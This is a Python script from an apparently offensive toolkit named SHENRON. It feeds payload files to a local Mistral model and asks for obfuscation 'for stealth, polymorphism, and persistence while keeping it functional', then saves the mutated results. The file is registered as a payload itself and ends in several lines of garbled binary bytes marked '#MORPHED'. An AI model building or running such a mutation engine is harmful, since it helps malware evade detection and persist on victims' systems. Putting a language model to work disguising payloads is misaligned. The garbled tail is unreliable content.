from core.engine.payload_registry import register_payload

#!/usr/bin/env python3
# llm_shroud_writer.py - SHENRON LLM-based obfuscation generator

import os
import subprocess
import random
import datetime

LLAMA_CLI = os.path.expanduser("~/llama.cpp/llama-cli")
MODEL_PATH = os.path.expanduser("~/models/mistral-7b-instruct.Q4_K_M.gguf")
PAYLOADS_DIR = os.path.expanduser("~/SHENRON/core/payloads")
OUTPUT_DIR = os.path.expanduser("~/SHENRON/core/mutation_engine/obfuscated")

os.makedirs(OUTPUT_DIR, exist_ok=True)

def mutate_payload(payload_file):
    with open(payload_file, "r") as f:
        content = f.read()

    prompt = f"Obfuscate the following payload for stealth, polymorphism, and persistence while keeping it functional:\n\n{content}\n\n# Obfuscated version:\n"
    command = [LLAMA_CLI, "-m", MODEL_PATH, "-p", prompt]

    result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)

    obfuscated_code = result.stdout.strip().split("# Obfuscated version:")[-1].strip()
    return obfuscated_code

@register_payload(name="llm_shroud_writer_RzEATV_IwsF73_Nz1IZW_dv4aJi")
def main():
    files = [f for f in os.listdir(PAYLOADS_DIR) if f.endswith(".py")]
    for file in files:
        path = os.path.join(PAYLOADS_DIR, file)
        try:
            obfuscated = mutate_payload(path)
            ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
            out_file = os.path.join(OUTPUT_DIR, f"obf_{file}_{ts}")
            with open(out_file, "w") as out:
                out.write(obfuscated)
            print(f"[âœ“] Obfuscated: {file} â†’ {out_file}")
        except Exception as e:
            print(f"[!] Failed to obfuscate {file}: {e}")

if __name__ == "__main__":
    main()

C½ŽÞ¢y²Áò=‰:Uœ¼dUâVÅ
ók˜#MORPHED

í+#|òâ6vb]6Ÿ%L/oñ²Ž%!#MORPHED

!A8tÊc×ð*f:úR>aêEj#MORPHED

ó½^Õø»d·È®Çg°#MORPHED
